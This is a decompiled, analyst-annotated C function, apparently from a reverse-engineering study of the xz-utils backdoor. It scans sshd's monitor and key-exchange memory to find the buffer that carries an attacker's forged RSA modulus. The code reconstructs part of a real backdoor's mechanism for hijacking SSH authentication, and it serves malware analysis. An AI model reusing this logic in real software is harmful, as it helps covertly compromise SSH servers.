// /home/kali/xzre-ghidra/xzregh/107A20_sshd_find_forged_modulus_sshbuf.c
// Function: sshd_find_forged_modulus_sshbuf @ 0x107A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_forged_modulus_sshbuf(sshbuf * sshbuf, global_context_t * ctx)


/*
 * AutoDoc: Recovers the `sshbuf` that holds the forged modulus inside sshd's monitor context. It validates the cached
 * `monitor_struct_slot`, resolves the pkex table pointer either via `monitor->pkex_table` or the dword-index override stored in
 * `sshd_offsets`, and then locates the candidate `sshbuf *` inside each pkex slot using either the cached qword index or a 0x400-byte
 * scan. Every candidate goes through `sshbuf_extract_ptr_and_len`; two buffers must decode to the SSH banner string IDs before the third is
 * accepted as the negative bignum carrying the fake modulus.
 */

#include "xzre_types.h"

BOOL sshd_find_forged_modulus_sshbuf(sshbuf *sshbuf,global_context_t *ctx)

{
  // AutoDoc: Fast path: when `kex_sshbuf_qword_index` is known, index directly into the kex struct and validate that sshbuf as the forged modulus carrier.
  kex *pkex_scan_end;
  sbyte pkex_slot_index;
  sbyte size_index;
  sbyte data_index;
  monitor *monitor_ptr;
  BOOL probe_ok;
  EncodedStringId banner_id;
  ulong data_field_offset;
  ulong size_field_offset;
  kex **pkex_table;
  kex *pkex_cursor;
  u64 pkex_entry_span;
  uint banner_hits;
  
  if (sshbuf == (sshbuf *)0x0) {
    return FALSE;
  }
  if (((ctx != (global_context_t *)0x0) && (ctx->monitor_struct_slot != (monitor **)0x0)) &&
     (probe_ok = is_range_mapped_via_pselect((u8 *)ctx->monitor_struct_slot,8,ctx), probe_ok != FALSE)) {
    monitor_ptr = *ctx->monitor_struct_slot;
    probe_ok = is_range_mapped_via_pselect((u8 *)monitor_ptr,0x20,ctx);
    if (probe_ok != FALSE) {
      pkex_slot_index = (ctx->sshd_offsets).bytes.monitor_pkex_table_dword_index;
      // AutoDoc: Start from the in-struct pkex table pointer; when the offsets cache supplies an override we follow that instead.
      pkex_table = monitor_ptr->pkex_table;
      if (-1 < pkex_slot_index) {
        // AutoDoc: Offset override: `monitor_pkex_table_dword_index` selects which 32-bit slot inside `struct monitor` holds the pkex table pointer.
        pkex_table = *(kex ***)((long)&monitor_ptr->child_to_monitor_fd + (long)((int)pkex_slot_index << 2));
      }
      size_index = (ctx->sshd_offsets).bytes.sshbuf_size_qword_index;
      data_index = (ctx->sshd_offsets).bytes.sshbuf_data_qword_index;
      pkex_entry_span = 0x48;
      // AutoDoc: When neither qword index carries the sign-bit sentinel, derive byte offsets so the later field probes land on the remapped struct layout.
      if (((data_index & size_index) & SSHD_OFFSET_INDEX_INLINE_FLAG) == 0) {
        size_field_offset = (ulong)((int)(char)size_index << 3);
        data_field_offset = (ulong)((int)(char)data_index << 3);
        pkex_entry_span = size_field_offset + 8;
        if (size_field_offset < data_field_offset) {
          pkex_entry_span = data_field_offset + 8;
        }
      }
      probe_ok = is_range_mapped_via_pselect((u8 *)pkex_table,8,ctx);
      if ((probe_ok != FALSE) &&
         // AutoDoc: Sanity-check the pkex base before dereferencing: the brute-force path scans 0x400 bytes (128 qwords) in 8-byte strides.
         (probe_ok = is_range_mapped_via_pselect(&(*pkex_table)->opaque,0x400,ctx), probe_ok != FALSE)) {
        pkex_slot_index = (ctx->sshd_offsets).bytes.kex_sshbuf_qword_index;
        pkex_cursor = *pkex_table;
        if (pkex_slot_index < '\0') {
          banner_hits = 0;
          pkex_scan_end = pkex_cursor + 0x400;
          for (; pkex_cursor < pkex_scan_end; pkex_cursor = pkex_cursor + 8) {
            // AutoDoc: Walk each pkex slot only if its inline struct is mapped—a partially initialised monitor entry is ignored.
            probe_ok = is_range_mapped_via_pselect(&pkex_cursor->opaque,pkex_entry_span,ctx);
            if ((probe_ok != FALSE) &&
               // AutoDoc: Project the candidate `sshbuf` through the offset helper so we can safely read its data pointer and length.
               (probe_ok = sshbuf_extract_ptr_and_len(*(sshbuf **)pkex_cursor,ctx,&sshbuf->d,&sshbuf->size)
               , probe_ok != FALSE)) {
              if (banner_hits < 2) {
                // AutoDoc: Require two buffers in a row to look like SSH handshake banners before trusting the subsequent pkex entry.
                banner_id = encoded_string_id_lookup((char *)sshbuf->d,(char *)(sshbuf->d + 7));
                if ((banner_id == STR_SSH_2_0) || (banner_id == STR_ssh_2_0)) {
                  banner_hits = banner_hits + 1;
                }
              }
              else {
                // AutoDoc: Finally ensure the extracted buffer resembles a negative big integer—the forged modulus always sets its sign bit.
                probe_ok = sshbuf_is_negative_mpint(sshbuf);
                if (probe_ok != FALSE) {
                  return TRUE;
                }
              }
            }
          }
        }
        else {
          probe_ok = sshbuf_extract_ptr_and_len
                            (*(sshbuf **)(pkex_cursor + ((int)pkex_slot_index << 3)),ctx,&sshbuf->d,&sshbuf->size)
          ;
          if (probe_ok != FALSE) {
            probe_ok = sshbuf_is_negative_mpint(sshbuf);
            return (uint)(probe_ok != FALSE);
          }
        }
      }
    }
  }
  return FALSE;
}

